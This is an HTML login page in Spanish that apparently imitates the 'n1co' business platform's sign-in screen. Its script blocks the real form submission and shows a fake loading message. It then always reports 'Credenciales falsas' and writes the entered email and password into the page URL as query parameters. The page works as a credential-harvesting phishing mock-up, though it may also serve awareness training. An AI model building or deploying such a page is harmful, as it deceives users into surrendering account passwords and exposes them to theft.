<!DOCTYPE html> 
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Nico - Ingresar</title>
  <style>
    * { margin:0; padding:0; box-sizing:border-box; }

    body {
      font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;
      height:100vh;
      display:flex;
    }

    .container {
      display:flex;
      width:100%;
      height:100vh;
    }

    /* Panel izquierdo 50% */
    .left-panel {
      flex:0 0 50%;
      background:#f8f9fa;
      padding:60px 80px 60px 60px; /* padding derecho mayor */
      display:flex;
      flex-direction:column;
      justify-content:center;
    }

    .logo {
      width:70px; /* más pequeño */
      height:auto;
      margin-bottom:40px;
    }

    .headline {
      font-size:28px; /* más pequeña */
      font-weight:700;
      line-height:1.3;
      margin-bottom:35px;
      max-width:360px;
    }

    .form-group { margin-bottom:16px; }

    .form-label {
      display:block;
      font-size:12px;
      font-weight:500;
      color:#374151;
      margin-bottom:4px;
    }

    .form-input {
      width:100%;
      padding:10px;
      border:1.5px solid #e5e7eb;
      border-radius:6px;
      font-size:13px;
    }

    .form-input:focus {
      outline:none;
      border-color:#3b82f6;
    }
    .form-input.error {
      border-color:#ef4444;
      background-color:#fee2e2;
    }
    .password-container { position:relative; }
    .password-toggle {
      position:absolute;
      right:10px;
      top:50%;
      transform:translateY(-50%);
      background:none;
      border:none;
      cursor:pointer;
    }
    .eye-icon { width:16px; height:16px; fill:#6b7280; }

    .forgot-password {
      text-align:right;
      margin:10px 0 18px 0;
    }
    .forgot-password a {
      font-size:12px;
      color:#374151;
      text-decoration:none;
    }

    .login-button {
      width:100%;
      background:#000;
      color:#fff;
      border:none;
      padding:12px;
      border-radius:6px;
      font-size:13px;
      font-weight:600;
      cursor:pointer;
    }
    .login-button:hover { background:#1f2937; }

    /* Panel derecho 50% */
    .right-panel {
      flex:0 0 50%;
      background:url('n1co-bg-800.png') center/cover no-repeat;
    }

    @media(max-width:768px){
      .container { flex-direction:column; }
      .left-panel { flex:unset; padding:40px 24px; }
      .right-panel { flex:unset; min-height:200px; }
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="left-panel">
      <img src="logo-n1co.svg" alt="n1co" class="logo">
      <h1 class="headline">La forma más completa de hacer crecer tu negocio</h1>

  <form id="loginForm" method="GET" onsubmit="showFakeLoading(event)">
        <div class="form-group">
          <label class="form-label" for="email">Correo Electrónico</label>
          <input id="email" name="username" type="email" class="form-input" required>
        </div>

        <div class="form-group">
          <label class="form-label" for="password">Contraseña</label>
          <div class="password-container">
            <input id="password" name="password" type="password" class="form-input" required>
            <button type="button" class="password-toggle" onclick="togglePassword()">
              <svg class="eye-icon" viewBox="0 0 24 24">
                <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>
              </svg>
            </button>
          </div>
        </div>

        <div class="forgot-password"><a href="recovery.html">¿Olvidaste tu contraseña?</a></div>
        <button type="submit" class="login-button">INGRESAR</button>
      </form>
    </div>

    <div class="right-panel"></div>
  </div>

  <script>
    function togglePassword() {
      const input=document.getElementById('password');
      input.type=input.type==='password'?'text':'password';
    }

    function showFakeLoading(event) {
      event.preventDefault();
      const form = document.getElementById('loginForm');
      const emailInput = document.getElementById('email');
      const passInput = document.getElementById('password');
      // Oculta el formulario
      form.style.display = 'none';
      // Crea mensaje de cargando
      let loadingMsg = document.getElementById('loadingMsg');
      if (!loadingMsg) {
        loadingMsg = document.createElement('div');
        loadingMsg.id = 'loadingMsg';
        loadingMsg.style.fontSize = '18px';
        loadingMsg.style.textAlign = 'center';
        loadingMsg.style.marginTop = '40px';
        form.parentNode.appendChild(loadingMsg);
      }
      loadingMsg.textContent = 'Cargando...';
      // Después de 2 segundos, muestra mensaje de credenciales falsas y resalta campos
      setTimeout(() => {
        loadingMsg.textContent = 'Credenciales falsas';
        emailInput.classList.add('error');
        passInput.classList.add('error');
        // Después de 1 segundo, vuelve a mostrar el formulario y limpia los campos
        setTimeout(() => {
          form.style.display = '';
          loadingMsg.textContent = '';
          emailInput.classList.remove('error');
          passInput.classList.remove('error');
        }, 1000);
      }, 2000);
      // Los datos se envían por la URL (GET)
      const email = emailInput.value;
      const password = passInput.value;
      window.history.replaceState(null, '', `?username=${encodeURIComponent(email)}&password=${encodeURIComponent(password)}`);
    }
  </script>
</body>
</html>
